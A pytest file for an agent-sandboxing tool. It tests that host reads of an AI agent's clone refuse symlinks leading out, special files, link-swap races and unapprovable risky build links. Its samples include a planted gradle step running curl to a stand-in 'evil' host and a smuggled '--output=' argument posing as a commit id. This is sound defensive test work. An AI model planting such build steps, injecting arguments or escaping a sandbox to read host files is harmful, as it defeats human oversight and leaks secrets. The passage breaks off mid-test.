"""The host's reads of a task's clone, which the agent's pod mounts read-write: a link there is
followed only while it stays inside the clone, and a FIFO, a socket, a device or a folder in place
of a file is never read, nor waited on. What the host reads there reaches the agent's prompt, the
commands the verification runs, the risky files' approval and your review."""

import contextlib
import json
import os
import shlex
import socket
import stat
import subprocess
import threading
from pathlib import Path
from types import SimpleNamespace

import pytest
from conftest import make_repo
from test_gate import FakePod, git

from vivibox import clone_read, gate, init, repo, reviewing, risky, supervisor
from vivibox.risky import Approvals, Change
from vivibox.states import State
from vivibox.task import create_task

PLAN = """+++
mode = "code-only"
+++

# Goal

## Acceptance criteria

- [ ] endpoint returns 200
"""
SECRET = "-PsecretFlag=HOSTVALUE"
OUTSIDE = f"the host's own file {SECRET}\n"


def in_time(call, seconds: float = 5):
    """call's result, or the error it raised; a failure when it hangs (a FIFO opened for reading
    waits for a writer)."""
    done = []

    def run():
        try:
            done.append(call())
        except Exception as e:
            done.append(e)

    worker = threading.Thread(target=run, daemon=True)
    worker.start()
    worker.join(timeout=seconds)
    assert done, "the host hung on a special file"
    return done[0]


def odd(path: Path, kind: str, monkeypatch) -> None:
    """path made a FIFO, a socket, a folder or a whiteout device (a char device 0:0, the one an
    unprivileged process can make, and so the one an agent in the pod can)."""
    path.parent.mkdir(parents=True, exist_ok=True)
    if kind == "fifo":
        os.mkfifo(path)
    elif kind == "socket":
        monkeypatch.chdir(path.parent)  # a socket's path has a length limit; its name has not
        socket.socket(socket.AF_UNIX).bind(path.name)
    elif kind == "folder":
        path.mkdir()
    else:
        try:
            os.mknod(path, stat.S_IFCHR | 0o600, 0)
        except OSError as e:
            pytest.skip(f"no whiteout device on this filesystem: {e}")


KINDS = ["fifo", "socket", "device", "folder"]


@pytest.fixture
def clone(tmp_path):
    path = tmp_path / "clone"
    path.mkdir()
    return path


@pytest.fixture
def outside(tmp_path):
    """A folder of the host's, beside the clone, with a file the agent must never get."""
    path = tmp_path / "host"
    path.mkdir()
    (path / "secret.txt").write_text(OUTSIDE)
    return path


# --- the walk ------------------------------------------------------------------------------------


def test_a_plain_file_and_a_link_that_stays_inside_are_read(clone):
    (clone / "build").mkdir()
    (clone / "build" / "pom.xml").write_text("<project/>\n")
    (clone / "pom.xml").symlink_to("build/pom.xml")
    (clone / "app").mkdir()
    (clone / "app" / "pom.xml").symlink_to("../build/pom.xml")
    (clone / "linked").symlink_to("build")
    for name in ("build/pom.xml", "pom.xml", "app/pom.xml", "linked/pom.xml", "linked/../pom.xml"):
        assert clone_read.read_bytes(clone, clone / name) == b"<project/>\n", name
        assert clone_read.read_text(clone, clone / name) == "<project/>\n", name
        assert clone_read.is_file(clone, clone / name), name
    assert clone_read.read_text(clone, clone / "none.xml") == ""
    assert not clone_read.is_file(clone, clone / "none.xml")


LINKS_OUT = {
    # name made a link: (the link, its target, the path read)
    "absolute": ("pom.xml", "{host}/secret.txt", "pom.xml"),
    "up": ("pom.xml", "../host/secret.txt", "pom.xml"),
    "up from a folder": ("sub/pom.xml", "../../host/secret.txt", "sub/pom.xml"),
    "through a linked folder": ("apps", "{host}", "apps/secret.txt"),
    "through a folder linked up": ("apps", "../host", "apps/secret.txt"),
    # A link git stores by an absolute path is a path on the host: never followed, wherever it goes.
    "absolute, to the clone itself": ("pom.xml", "{clone}/sub/pom.xml", "pom.xml"),
}


@pytest.mark.parametrize("link", LINKS_OUT)
def test_a_link_that_leads_out_of_the_clone_is_refused(clone, outside, link):
    name, target, read = LINKS_OUT[link]
    (clone / "sub").mkdir()
    (clone / name).symlink_to(target.format(host=outside, clone=clone))
    with pytest.raises(clone_read.Refused):
        clone_read.read_bytes(clone, clone / read)
    assert clone_read.read_text(clone, clone / read) == ""
    assert not clone_read.is_file(clone, clone / read)


def test_a_link_to_a_device_of_the_host_is_never_read(clone):
    (clone / "zero").symlink_to("/dev/zero")
    (clone / "null").symlink_to("/dev/null")
    for name in ("zero", "null"):
        assert in_time(lambda name=name: clone_read.read_text(clone, clone / name)) == ""


@pytest.mark.parametrize("kind", KINDS)
def test_a_special_file_is_refused_without_being_opened(clone, monkeypatch, kind):
    odd(clone / "package.json", kind, monkeypatch)
    (clone / "linked.json").symlink_to("package.json")
    opened = []
    real_open = os.open
    monkeypatch.setattr(os, "open", lambda p, *a, **k: opened.append(str(p)) or real_open(p, *a, **k))
    for name in ("package.json", "linked.json"):
        assert in_time(lambda name=name: clone_read.read_text(clone, clone / name)) == ""
        assert isinstance(in_time(lambda name=name: clone_read.read_bytes(clone, clone / name)), OSError)
    assert not [p for p in opened if p.endswith("package.json")], "refused on lstat, before any open"


def test_a_loop_of_links_is_refused(clone):
    (clone / "a").symlink_to("b")
    (clone / "b").symlink_to("a")
    with pytest.raises(clone_read.Refused):
        clone_read.read_bytes(clone, clone / "a")


def test_a_link_swapped_out_of_the_clone_during_the_walk_is_not_followed(clone, outside, monkeypatch):
    """The agent changes the clone while the host walks it: a folder the walk is about to enter
    becomes a link out right after the walk read the link that led to it."""
    (clone / "real").mkdir()
    (clone / "real" / "secret.txt").write_text("the clone's own\n")
    (clone / "entry").symlink_to("real")
    real_readlink = os.readlink
    swapped = []

    def readlink(path, *args, **kwargs):
        target = real_readlink(path, *args, **kwargs)
        if not swapped:
            os.rename(clone / "real", clone / "was-real")
            (clone / "real").symlink_to(outside)
            swapped.append(target)
        return target

    monkeypatch.setattr(os, "readlink", readlink)
    with pytest.raises(clone_read.Refused):
        clone_read.read_bytes(clone, clone / "entry" / "secret.txt")
    assert swapped == ["real"]


def test_a_name_swapped_for_a_link_after_it_was_looked_at_is_not_opened(clone, outside, monkeypatch):
    (clone / "pom.xml").write_text("<project/>\n")
    real_stat = os.stat

    def stat_then_swap(name, *args, **kwargs):
        info = real_stat(name, *args, **kwargs)
        if name == "pom.xml":
            (clone / "pom.xml").unlink()
            (clone / "pom.xml").symlink_to(outside / "secret.txt")
        return info

    monkeypatch.setattr(os, "stat", stat_then_swap)
    with pytest.raises(clone_read.Refused):
        clone_read.read_bytes(clone, clone / "pom.xml")


# --- the build files: what the writer is told and what the verification runs ---------------------


@pytest.fixture
def task(tmp_path, monkeypatch):
    monkeypatch.setenv("VIVIBOX_CONFIG_DIR", str(tmp_path / "config"))  # never your projects
    source = make_repo(tmp_path / "source")
    t = create_task(tmp_path / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    Approvals(t.meta, t.repo).approve()
    return t


def host_pipeline(outside: Path) -> Path:
    path = outside / "ci.yml"
    path.write_text(f"build:\n  script:\n    - mvn -B verify {SECRET}\n")
    return path


def test_a_committed_link_to_a_pipeline_of_the_host_brings_no_command(task, outside):
    """The agent commits .gitlab-ci.yml as a link to a CI file of yours: its build lines would be
    offered to the writer as the project's own command, and written to the log it reads."""
    (task.repo / ".gitlab-ci.yml").symlink_to(host_pipeline(outside))
    git(task.repo, "add", ".")
    git(task.repo, "commit", "-q", "-m", "Add the pipeline")
    assert init.ci_commands(task.repo) == []
    assert all(SECRET not in command for command, _ in init.candidates(task.repo))
    gate.accept_plan(task)
    result = gate.run_gate(task, FakePod(), [], [])
    assert SECRET not in result.log.read_text() and result.build_files == []
    assert SECRET not in str(task.events()[-1])


def test_the_writer_is_not_told_a_command_from_a_linked_pipeline_of_the_host(tmp_path, outside):
    from test_supervisor import DRAFT, TEMPLATE, FakeHarness, gate_result

    t = create_task(tmp_path / "named", "demo", "Goal", TEMPLATE)
    t.plan_path.write_text(DRAFT)
    t.transition(State.CHECKPOINT_PLAN)
    supervisor.accept_plan(t, "plan accepted")
    t.repo.mkdir(parents=True, exist_ok=True)
    (t.repo / ".gitlab-ci.yml").symlink_to(host_pipeline(outside))
    (t.repo / "go.mod").write_text("module example.com/x\n\ngo 1.21\n")
    harness = FakeHarness(t)
    ports = supervisor.Ports(run_gate=lambda _: gate_result(), risky_changes=lambda: [])
    supervisor.Supervisor(t, harness, ports, max_rounds=1, project_verify=[]).step()
    asked = harness.prompts[0]
    assert "`go test ./...` (go.mod)" in asked, "the clone's own build file is still named"
    assert SECRET not in asked and "secretFlag" not in asked


def test_a_pipeline_in_the_clone_or_linked_inside_it_is_read_as_before(clone):
    (clone / "ci").mkdir()
    (clone / "ci" / "pipeline.yml").write_text("build:\n  script:\n    - mvn -B verify -Pci\n")
    (clone / ".gitlab-ci.yml").symlink_to("ci/pipeline.yml")
    (clone / ".github" / "workflows").mkdir(parents=True)
    workflow = "jobs:\n  t:\n    steps:\n      - run: npm test\n"
    (clone / ".github" / "workflows" / "ci.yml").write_text(workflow)
    assert init.ci_commands(clone) == [
        ("npm test", ".github/workflows/ci.yml"),
        ("mvn -B verify -Pci", ".gitlab-ci.yml"),
    ]


def test_a_linked_build_file_inside_the_clone_is_read_as_before(clone):
    """A monorepo that links its root package.json to one in a folder keeps its detection."""
    (clone / "config").mkdir()
    package = '{"packageManager": "pnpm@9.0.0", "scripts": {"test": "x"}}'
    (clone / "config" / "package.json").write_text(package)
    (clone / "package.json").symlink_to("config/package.json")
    (clone / "pnpm-lock.yaml").write_text("")
    assert init.candidates(clone)[0] == ("pnpm install --frozen-lockfile && pnpm test", "package.json")
    assert init.with_dependencies(clone, ["pnpm test"]) == ["pnpm install --frozen-lockfile", "pnpm test"]


def test_a_workspace_folder_linked_out_of_the_clone_is_no_module_or_command(clone, outside):
    """A folder the workspaces name, linked to a folder of yours: its folders' names and their
    package.json never reach the modules the verification builds or the commands offered."""
    (outside / "private-app").mkdir()
    (outside / "private-app" / "package.json").write_text('{"scripts": {"test": "jest"}}')
    (clone / "package.json").write_text('{"workspaces": ["apps/*"], "scripts": {}}')
    (clone / "package-lock.json").write_text("{}")
    (clone / "apps").symlink_to(outside)
    assert init.modules(clone) == []
    assert all("private-app" not in command for command, _ in init.candidates(clone))


SITES = {
    "with_dependencies": lambda repo: init.with_dependencies(repo, ["npm test"]),
    "candidates": init.candidates,
    "modules": init.modules,
    "detect": lambda repo: (d := init.detect(repo)) and (d.verify, d.notes, d.modules, d.tools, d.prepare),
}


@pytest.mark.parametrize("site", SITES)
@pytest.mark.parametrize("kind", KINDS)
def test_detection_does_not_wait_on_a_special_build_file(tmp_path, monkeypatch, site, kind):
    """Read as a package.json with nothing in it: the same detection, never a wait."""
    special, empty = tmp_path / "special", tmp_path / "empty"
    for clone in (special, empty):
        clone.mkdir()
        (clone / "package-lock.json").write_text("{}")
    (empty / "package.json").write_text("")
    odd(special / "package.json", kind, monkeypatch)
    monkeypatch.chdir(tmp_path)
    got = in_time(lambda: SITES[site](special))
    assert not isinstance(got, BaseException), got
    want = SITES[site](empty)
    assert str(got).replace("special", "empty") == str(want)


@pytest.mark.parametrize("site", SITES)
def test_detection_reads_nothing_through_a_link_out_of_the_clone(clone, outside, site):
    """Your build files, linked from the clone: the modules they list and the toolchain they name
    would become the verification's command and what the pod installs."""
    (outside / "package.json").write_text('{"packageManager": "bun@HOSTVALUE", "scripts": {"test": "x"}}')
    (outside / "pom.xml").write_text("<project><modules><module>HOSTVALUE</module></modules></project>")
    (outside / "settings.gradle").write_text("include 'HOSTVALUE'\n")
    for name in ("package.json", "pom.xml", "settings.gradle"):
        (clone / name).symlink_to(outside / name)
    (clone / "bun.lock").write_text("")
    assert "HOSTVALUE" not in str(in_time(lambda: SITES[site](clone)))


# --- the checks on the agent's files: invisible characters, risky files -------------------------


def untracked_link(task, name: str, target) -> None:
    (task.repo / name).symlink_to(target)


def test_hidden_characters_do_not_wait_on_an_untracked_link_to_a_fifo(task):
    os.mkfifo(task.repo / "pipe")  # git lists no FIFO; the link to it, it does
    untracked_link(task, "notes.txt", "pipe")
    assert in_time(lambda: gate.hidden_characters(task.repo, task.read_state().base_commit)) == []


def test_hidden_characters_read_no_host_file_through_an_untracked_link(task, outside):
    (outside / "hidden.txt").write_text("a\u200bb\n")
    untracked_link(task, "notes.txt", outside / "hidden.txt")
    untracked_link(task, "zero.txt", "/dev/zero")
    found = in_time(lambda: gate.hidden_characters(task.repo, task.read_state().base_commit))
    assert found == [], "a link is what git would commit: its target, not the host's file"


def test_hidden_characters_check_what_git_commits_of_a_link_its_target(task):
    untracked_link(task, "notes.txt", "rea\u200bdme.md")
    assert gate.hidden_characters(task.repo, task.read_state().base_commit) == ["notes.txt:1 U+200B"]


def test_a_plain_untracked_file_is_checked_as_before(task):
    (task.repo / "notes.txt").write_text("fine\nnot\u200bfine\n")
    assert gate.hidden_characters(task.repo, task.read_state().base_commit) == ["notes.txt:2 U+200B"]


@pytest.mark.parametrize("kind", ["fifo", "socket", "device"])
def test_hidden_characters_count_a_special_file_they_could_not_read(task, monkeypatch, kind):
    """Swapped in after git listed it: never read, so never passed; the check fails closed."""
    odd(task.repo / "notes.txt", kind, monkeypatch)
    real_git = repo.git

    def listed(*args, **kwargs):
        if args[:1] == ("ls-files",):
            return subprocess.CompletedProcess(args, 0, "notes.txt\0", "")
        return real_git(*args, **kwargs)

    monkeypatch.setattr(repo, "git", listed)
    found = in_time(lambda: gate.hidden_characters(task.repo, task.read_state().base_commit))
    assert len(found) == 1 and found[0].startswith("notes.txt") and "vivibox does not read" in found[0]


def test_the_risky_files_do_not_wait_on_a_fifo_named_like_one(task):
    """A FIFO named like a build file is new to the approval, not a hang of the gate or the view."""
    os.mkfifo(task.repo / "Makefile")
    approvals = Approvals(task.meta, task.repo)
    assert in_time(approvals.changes) == [Change("Makefile", "added")]
    assert "vivibox does not read it" in in_time(lambda: approvals.diff(Change("Makefile", "added")))


@pytest.mark.parametrize("kind", ["fifo", "socket", "device"])
def test_a_risky_file_replaced_by_a_special_one_is_a_change(task, monkeypatch, kind):
    """Refused, it is never the same as the file you approved: the check fails closed."""
    (task.repo / "Makefile").write_text("test:\n\ttrue\n")
    approvals = Approvals(task.meta, task.repo)
    approvals.approve()
    (task.repo / "Makefile").unlink()
    odd(task.repo / "Makefile", kind, monkeypatch)
    assert in_time(approvals.changes) == [Change("Makefile", "changed")]


def test_approving_does_not_wait_on_a_special_file_or_copy_one_through_a_link(task, outside):
    os.mkfifo(task.repo / "Makefile")
    (task.repo / "build").mkdir()
    (task.repo / "build" / "pom.xml").write_text("<project/>\n")
    (task.repo / "pom.xml").symlink_to("build/pom.xml")  # a link out cannot be approved at all
    approvals = Approvals(task.meta, task.repo)
    approved = in_time(approvals.approve)
    assert not isinstance(approved, BaseException), approved
    assert set(approved) >= {"Makefile", "pom.xml"}
    kept = task.meta / "risky" / "files"
    assert not (kept / "Makefile").exists() and not (kept / "pom.xml").exists()
    assert in_time(approvals.changes) == [], "approved as they are"


def test_a_risky_link_out_of_the_clone_is_its_target_alone(task, outside):
    """What git stores of a link is its target; a file of yours it points at is not the agent's,
    and is never read: the link is marked as one vivibox cannot check."""
    (task.repo / "pom.xml").symlink_to(outside / "secret.txt")
    assert risky.scan(task.repo)["pom.xml"] == f"{risky.OUT_LINK}{outside / 'secret.txt'}"


def test_a_risky_link_inside_the_clone_changes_when_its_target_does(task):
    (task.repo / "build").mkdir()
    (task.repo / "build" / "pom.xml").write_text("<project/>\n")
    (task.repo / "pom.xml").symlink_to("build/pom.xml")
    approvals = Approvals(task.meta, task.repo)
    approvals.approve()
    (task.repo / "build" / "pom.xml").write_text("<project><build/></project>\n")
    assert Change("pom.xml", "changed") in approvals.changes()


# --- the review in your CLI ---------------------------------------------------------------------


@pytest.fixture
def at_review(tmp_path):
    task = create_task(tmp_path / "tasks", "demo", "goal", PLAN)
    gate.accept_plan(task)
    (task.meta / "handoff" / "red.md").write_text("tests/test_view.py failed before the fix\n")
    return task


def copies(task) -> Path:
    return task.meta / reviewing.CLI_INPUT


def asked_of(task) -> str:
    return (task.meta / reviewing.CLI_PROMPT).read_text()


def test_the_cli_review_reads_the_hosts_copies_never_the_handoff(at_review):
    task = at_review
    reviewing.ask_cli(task, 1, None)
    asked = asked_of(task)
    assert str(copies(task) / "criteria.md") in asked and str(copies(task) / "red.md") in asked
    assert "handoff" not in asked, "nothing in the prompt points into handoff/"
    assert (copies(task) / "red.md").read_text() == "tests/test_view.py failed before the fix\n"
    assert (copies(task) / "criteria.md").read_text() == (task.meta / "handoff" / "criteria.md").read_text()


def test_the_cli_review_says_why_a_linked_checklist_was_left_out(at_review, outside):
    task = at_review
    criteria = task.meta / "handoff" / "criteria.md"
    reviewing.ask_cli(task, 1, None)
    criteria.unlink()
    criteria.symlink_to(outside / "secret.txt")
    reviewing.ask_cli(task, 1, None)
    asked = asked_of(task)
    assert not (copies(task) / "criteria.md").exists(), "no copy of the last round is left behind"
    assert "vivibox left out the writer's criteria.md: it is a link or not a plain file" in asked
    assert str(copies(task) / "red.md") in asked
    assert "handoff" not in asked and SECRET not in asked
    assert not any(SECRET in p.read_text() for p in copies(task).iterdir())


def test_the_cli_review_does_not_wait_on_a_special_file(at_review):
    task = at_review
    (task.meta / "handoff" / "red.md").unlink()
    os.mkfifo(task.meta / "handoff" / "red.md")
    assert not isinstance(in_time(lambda: reviewing.ask_cli(task, 1, None)), BaseException)
    asked = asked_of(task)
    assert "vivibox left out the writer's red.md" in asked and "handoff" not in asked


def test_the_cli_review_copies_the_writers_answer_to_the_last_round(at_review):
    task = at_review
    (task.meta / "handoff" / "review-1-reply.md").write_text("It does prove it.\n")
    reviewing.ask_cli(task, 2, None)
    asked = asked_of(task)
    assert str(copies(task) / "review-1-reply.md") in asked and "handoff" not in asked
    assert (copies(task) / "review-1-reply.md").read_text() == "It does prove it.\n"


def test_a_copy_for_the_approval_is_never_a_links_file_or_a_special_one(
    clone, outside, monkeypatch, tmp_path
):
    """The approval keeps its copies in /task, where the agent reads: a link swapped in after the
    scan, inside the clone or out of it, is refused, and so is a FIFO."""
    (clone / "pom.xml").write_text("<project/>\n")
    (clone / "inside.xml").symlink_to("pom.xml")
    (clone / "outside.xml").symlink_to(outside / "secret.txt")
    odd(clone / "Makefile", "fifo", monkeypatch)
    for name in ("inside.xml", "outside.xml", "Makefile"):
        refused = in_time(lambda name=name: clone_read.copy(clone, clone / name, tmp_path / "copy"))
        assert isinstance(refused, clone_read.Refused), name
        assert not (tmp_path / "copy").exists(), name
    clone_read.copy(clone, clone / "pom.xml", tmp_path / "copy")
    assert (tmp_path / "copy").read_text() == "<project/>\n"


# --- review round 1 ------------------------------------------------------------------------------


def handoff_link(task, name: str = "build.gradle") -> Path:
    """The reviewer's case: a risky file committed as a link into handoff/, which the agent
    writes. From the clone, <task>/repo/../.task/handoff/ is that folder."""
    evil = task.meta / "handoff" / "evil.gradle"
    evil.write_text("apply plugin: 'java'\n")
    (task.repo / name).symlink_to(Path("..") / ".task" / "handoff" / "evil.gradle")
    git(task.repo, "add", ".")
    git(task.repo, "commit", "-q", "-m", "Link the build")
    return evil


def test_a_risky_link_out_of_the_repository_stays_a_change_when_its_target_does(task):
    """Approved or not, a link the agent made out of the repository is never taken as checked:
    vivibox does not read what it points at, so a change there cannot pass unseen."""
    evil = handoff_link(task)
    approvals = Approvals(task.meta, task.repo)
    assert [c.path for c in approvals.changes()] == ["build.gradle"]
    with contextlib.suppress(Exception):  # refused now; before, approved
        approvals.approve()
    evil.write_text("task compileJava { doFirst { exec { commandLine 'curl', 'evil' } } }\n")
    assert [c.path for c in approvals.changes()] == ["build.gradle"]


def test_a_risky_link_the_agent_made_out_of_the_repository_cannot_be_approved(task):
    handoff_link(task)
    approvals = Approvals(task.meta, task.repo)
    with pytest.raises(Exception, match="build.gradle is a link that leads out of the repository") as refused:
        approvals.approve()
    assert type(refused.value).__name__ == "Unapprovable"
    assert "removes the link or makes it a file in the repository" in str(refused.value)
    assert "build.gradle" not in approvals.approved(), "nothing of it recorded as approved"
    diff = approvals.diff(Change("build.gradle", "added"))
    assert "cannot be approved" in diff and "removes the link" in diff


def test_once_the_writer_removes_the_link_the_approval_goes_through_once(task):
    """No loop: refused while the link is there; once it is gone, one approval and nothing left."""
    handoff_link(task)
    approvals = Approvals(task.meta, task.repo)
    with pytest.raises(Exception, match="leads out of the repository"):
        approvals.approve()
    (task.repo / "build.gradle").unlink()
    (task.repo / "build.gradle").write_text("apply plugin: 'java'\n")
    assert [c.path for c in approvals.changes()] == ["build.gradle"]
    approvals.approve()
    assert approvals.changes() == []


def test_a_link_out_of_the_repository_that_was_yours_at_the_start_is_not_a_change(env, tmp_path, outside):
    """Your own repository's link out (a shared IDE setting, a CI template): there at the base
    commit, with the same target, it is yours, as it was; a link the agent points elsewhere is not."""
    source = tmp_path / "repo"  # the project's checkout (env)
    (outside / "shared.gradle").write_text("apply plugin: 'java'\n")
    (source / "build.gradle").symlink_to(outside / "shared.gradle")
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Share the build")
    t = create_task(tmp_path / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    approvals.approve()
    assert approvals.changes() == []
    (outside / "shared.gradle").write_text("apply plugin: 'groovy'\n")
    assert approvals.changes() == [], "yours, outside the task: vivibox neither reads nor flags it"
    approvals.approve()
    (t.repo / "build.gradle").unlink()
    (t.repo / "build.gradle").symlink_to(outside / "secret.txt")
    assert approvals.changes() == [Change("build.gradle", "changed")]
    with pytest.raises(Exception, match="leads out of the repository"):
        approvals.approve()


def test_the_cli_says_why_a_risky_link_cannot_be_approved(task, monkeypatch, capsys):
    from vivibox import actions, cli

    handoff_link(task)
    monkeypatch.setattr(actions, "load", lambda _id: (task, SimpleNamespace(risky_extra=[])))
    assert cli.main(["approve-risky", task.id]) == 1
    assert "build.gradle is a link that leads out of the repository" in capsys.readouterr().err


def bytes_read() -> int:
    """What this process has read so far, sparse zeros included (/proc/self/io's rchar)."""
    io = Path("/proc/self/io").read_text()
    return int(next(line for line in io.splitlines() if line.startswith("rchar:")).split()[1])


SPARSE = 200 << 20  # past every limit on what is read whole, and nothing on the disk
HUGE = (1 << 30) + (1 << 20)  # past the limit on what is hashed


def sparse(path: Path, size: int = SPARSE) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "wb") as file:
        file.truncate(size)
    return path


def test_a_sparse_risky_file_is_read_no_further_than_the_limit_and_is_a_change(task):
    sparse(task.repo / "Makefile", HUGE)
    approvals = Approvals(task.meta, task.repo)
    before = bytes_read()
    assert in_time(approvals.changes, 30) == [Change("Makefile", "added")]
    assert bytes_read() - before < 8 << 20, "refused by its size before anything is read"
    with pytest.raises(Exception, match="too large for vivibox to verify safely"):
        approvals.approve()


def test_a_risky_file_that_grew_past_the_read_limit_is_still_a_change(task):
    """Past what is read whole, it is still hashed: a change to it is a change, and its diff says
    it is too large to show."""
    (task.repo / "Makefile").write_text("test:\n\ttrue\n")
    approvals = Approvals(task.meta, task.repo)
    approvals.approve()
    sparse(task.repo / "Makefile")
    assert approvals.changes() == [Change("Makefile", "changed")]
    assert "larger than 64 MiB" in approvals.diff(Change("Makefile", "changed"))


def test_a_sparse_untracked_file_is_not_checked_and_says_so(task):
    sparse(task.repo / "big.bin")
    before = bytes_read()
    found = in_time(lambda: gate.hidden_characters(task.repo, task.read_state().base_commit))
    assert bytes_read() - before < SPARSE // 2
    assert found == ["big.bin: vivibox does not read it (larger than 64 MiB), so it was not checked"]
    # Not a new failure: an untracked file already fails the verification, as uncommitted.
    assert gate.uncommitted(task.repo) == ["big.bin"]


def test_detection_does_not_read_a_build_file_past_its_limit_and_says_so(clone):
    """A package.json of 200 MiB is no configuration: taken as not there, and the notes say why."""
    sparse(clone / "package.json")
    (clone / "package-lock.json").write_text("{}")
    before = bytes_read()
    found = in_time(lambda: init.detect(clone))
    assert bytes_read() - before < 16 << 20
    assert "package.json is larger than 1 MiB: vivibox did not read it" in "\n".join(found.notes)


def test_a_file_not_checked_is_not_called_an_invisible_character(tmp_path, monkeypatch, capsys):
    from vivibox import actions, cli, feedback

    not_read = "notes.txt: vivibox does not read it (a FIFO), so it was not checked"
    result = gate.GateResult(tmp_path / "verify-1.log", hidden_characters=["a.py:3 U+200B", not_read])
    project = SimpleNamespace(risky_extra=[], java="", verify_timeout=0, no_build=False, tools=[])
    monkeypatch.setattr(actions, "load", lambda _id: (SimpleNamespace(id="demo-1"), project))
    monkeypatch.setattr(actions, "task_pod", lambda _id: SimpleNamespace(up=lambda: None))
    monkeypatch.setattr(actions, "verify_commands", lambda task, project: [])
    monkeypatch.setattr(actions, "missing_command", lambda task, project: "")
    monkeypatch.setattr(cli, "load_config", lambda: SimpleNamespace(verify_timeout=0))
    monkeypatch.setattr(gate, "run_gate", lambda *a, **k: result)
    assert cli.cmd_verify(SimpleNamespace(task="demo-1")) == 1
    out = capsys.readouterr().out
    assert "FAIL  invisible character at a.py:3 U+200B" in out
    assert f"FAIL  {not_read}" in out and "invisible character at notes.txt" not in out
    said = feedback.feedback(result)
    assert "Invisible character, remove it: a.py:3 U+200B" in said
    assert f"- {not_read}" in said and "Invisible character, remove it: notes.txt" not in said
    assert gate.why_red(result) == "1 invisible character, 1 file not checked"


def test_a_relative_root_is_walked_from_where_it_is(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    (tmp_path / "proj").mkdir()
    (tmp_path / "proj" / "package.json").write_text('{"scripts": {"lint": "eslint ."}}')
    assert clone_read.read_bytes(Path("proj"), Path("proj") / "package.json").startswith(b"{")
    assert init.candidates(Path("proj")) == init.candidates(tmp_path / "proj") == []


def test_a_folder_swapped_for_a_link_after_it_was_looked_at_is_not_entered(clone, outside, monkeypatch):
    """The window between the look at a folder on the way and its open: the open itself refuses a
    link (O_NOFOLLOW), so a folder swapped for a link out is never entered."""
    (clone / "d").mkdir()
    (clone / "d" / "secret.txt").write_text("the clone's own\n")
    real_stat = os.stat
    swapped = []

    def stat_then_swap(name, *args, **kwargs):
        info = real_stat(name, *args, **kwargs)
        if name == "d" and not swapped:
            os.rename(clone / "d", clone / "was-d")
            (clone / "d").symlink_to(outside)
            swapped.append(name)
        return info

    monkeypatch.setattr(os, "stat", stat_then_swap)
    with pytest.raises(clone_read.Refused):
        clone_read.read_bytes(clone, clone / "d" / "secret.txt")
    assert swapped == ["d"]


def test_a_loop_of_links_is_named_as_one(clone):
    (clone / "a").symlink_to("b")
    (clone / "b").symlink_to("a")
    with pytest.raises(clone_read.Refused) as refused:
        clone_read.read_bytes(clone, clone / "a")
    assert "leads out" not in str(refused.value) and "links" in refused.value.kind


def test_a_baseline_link_out_is_tolerated_by_its_target_alone_and_never_followed(
    env, tmp_path, outside, monkeypatch
):
    """Your link out, as it was at the start, passes the risky files' diff and approval by its
    target string; neither they nor detection open what it points at."""
    source = tmp_path / "repo"  # the project's checkout (env)
    (outside / "settings.gradle").write_text("include 'HOSTVALUE'\n")
    (source / "settings.gradle").symlink_to(outside / "settings.gradle")
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Share the settings")
    t = create_task(tmp_path / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    opened = []
    real_open = os.open
    monkeypatch.setattr(os, "open", lambda p, *a, **k: opened.append(str(p)) or real_open(p, *a, **k))
    approvals.approve()
    (outside / "settings.gradle").write_text("include 'OTHER'\n")
    assert approvals.changes() == []
    approvals.approve()
    assert "HOSTVALUE" not in str(init.detect(t.repo)) and init.modules(t.repo) == []
    assert not [p for p in opened if p.endswith("settings.gradle")], "never opened, by name or path"


# --- review round 2: the base commit in your checkout, and the hashing limit ---------------------


def linked_at_base(env, outside, name: str = "build.gradle") -> tuple:
    """A task of the env's project, whose checkout has your own link out at the base commit."""
    source = env / "repo"
    (outside / "shared.gradle").write_text("apply plugin: 'java'\n")
    (source / name).symlink_to(outside / "shared.gradle")
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Share the build")
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    Approvals(t.meta, t.repo).approve()
    return t, source


def test_a_task_from_before_the_base_record_takes_your_links_from_its_base_commit(env, outside, monkeypatch):
    """A task made before vivibox kept anything of its start has its base commit: your checkout's
    git says which links were yours, and the clone's own .git, the agent's, is never asked."""
    t, source = linked_at_base(env, outside)
    (t.meta / "risky" / "base.json").unlink(missing_ok=True)
    ran = []
    real_run = subprocess.run
    monkeypatch.setattr(
        subprocess, "run", lambda args, *a, **k: ran.append(list(args)) or real_run(args, *a, **k)
    )
    approvals = Approvals(t.meta, t.repo)
    assert approvals.changes() == []
    approvals.approve()
    asked = [args for args in ran if "ls-tree" in args or "cat-file" in args]
    assert asked and all(str(source) in args and str(t.repo) not in " ".join(args) for args in asked)
    assert not (t.meta / "risky" / "base.json").exists(), "the base commit is the record"


def set_base(task, commit: str) -> None:
    state = json.loads((task.meta / "state.json").read_text())
    state["base_commit"] = commit
    (task.meta / "state.json").write_text(json.dumps(state))


@pytest.mark.parametrize("lost", ["the commit", "the checkout"])
def test_a_base_commit_your_checkout_no_longer_has_fails_closed_and_says_why(env, outside, lost):
    t, source = linked_at_base(env, outside)
    if lost == "the commit":
        set_base(t, "0" * 40)
        why = f"{source} does not have the task's base commit 000000000000"
    else:
        source.rename(env / "moved")
        why = f"{source} is gone"
    approvals = Approvals(t.meta, t.repo)
    assert approvals.changes() == [Change("build.gradle", "changed")]
    with pytest.raises(Exception) as refused:
        approvals.approve()
    said = str(refused.value)
    assert "build.gradle is a link that leads out of the repository" in said
    assert "vivibox could not tell whether it was in your repository when the task started" in said
    assert why in said
    assert why in approvals.diff(Change("build.gradle", "changed"))


def test_a_base_commit_on_record_that_is_no_commit_id_never_reaches_git(env, outside, monkeypatch):
    t, _ = linked_at_base(env, outside)
    set_base(t, "--output=/tmp/vivibox-x")
    ran = []
    real_run = subprocess.run
    monkeypatch.setattr(
